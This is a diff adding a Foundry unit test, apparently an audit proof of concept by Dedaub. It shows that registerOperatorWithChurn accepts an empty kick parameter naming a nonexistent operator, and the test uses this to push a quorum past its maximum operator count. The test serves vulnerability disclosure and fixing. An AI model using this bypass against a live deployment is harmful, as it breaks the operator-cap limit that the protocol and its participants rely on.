@@ -1956,6 +1956,68 @@ contract RegistryCoordinatorUnitTests_RegisterOperatorWithChurn is RegistryCoord
             emptyAVSRegSig
         );
     }
+
+    /// @dev M2-POC by Dedaub, reverting for demonstration purposes
+    function test_registerOperatorWithChurn_BypassMaxOperatorCount(
+        uint256 pseudoRandomNumber
+    ) public {
+        bytes memory quorumNumbers = new bytes(1);
+        quorumNumbers[0] = bytes1(0);
+        ISignatureUtilsMixinTypes.SignatureWithSaltAndExpiry memory emptyAVSRegSig;
+
+        uint32 kickRegistrationBlockNumber = 100;
+
+        uint256 quorumBitmap = BitmapUtils.orderedBytesArrayToBitmap(quorumNumbers);
+
+        cheats.roll(kickRegistrationBlockNumber);
+
+        // register all operators until the quorum is full
+        for (uint256 i = 0; i < defaultMaxOperatorCount; i++) {
+            BN254.G1Point memory pubKey =
+                BN254.hashToG1(keccak256(abi.encodePacked(pseudoRandomNumber, i)));
+            address operator = _incrementAddress(defaultOperator, i);
+
+            _registerOperatorWithCoordinator(operator, quorumBitmap, pubKey);
+        }
+
+        // prepare the operator to register
+        address operatorToRegister = _incrementAddress(defaultOperator, defaultMaxOperatorCount);
+        BN254.G1Point memory operatorToRegisterPubKey = BN254.hashToG1(keccak256(abi.encodePacked(pseudoRandomNumber, defaultMaxOperatorCount)));
+        bytes32 operatorToRegisterId = BN254.hashG1Point(operatorToRegisterPubKey);
+        blsApkRegistry.setBLSPublicKey(operatorToRegister, operatorToRegisterPubKey);
+        _setOperatorWeight(operatorToRegister, defaultQuorumNumber, defaultStake);
+
+
+        // Use empty operatorKickParams.
+        // This means the address of the operator to kick is 0 which refers to a non-existing operator.
+        ISlashingRegistryCoordinatorTypes.OperatorKickParam[] memory operatorKickParams =
+            new ISlashingRegistryCoordinatorTypes.OperatorKickParam[](1);
+
+
+        ISignatureUtilsMixinTypes.SignatureWithSaltAndExpiry memory signatureWithExpiry =
+        _signOperatorChurnApproval(
+            operatorToRegister,
+            operatorToRegisterId,
+            operatorKickParams,
+            defaultSalt,
+            block.timestamp + 10
+        );
+        cheats.prank(operatorToRegister);
+
+        // register with churn using an non-existing operator to kick
+        registryCoordinator.registerOperatorWithChurn(
+            quorumNumbers,
+            defaultSocket,
+            pubkeyRegistrationParams,
+            operatorKickParams,
+            signatureWithExpiry,
+            emptyAVSRegSig
+        );
+
+        // The total number of operators exceeded the max number
+        uint32 count = indexRegistry.totalOperatorsForQuorum(0);
+        assertEq(count , defaultMaxOperatorCount + 1);
+    }
 }
 
 contract RegistryCoordinatorUnitTests_UpdateOperators is RegistryCoordinatorUnitTests {
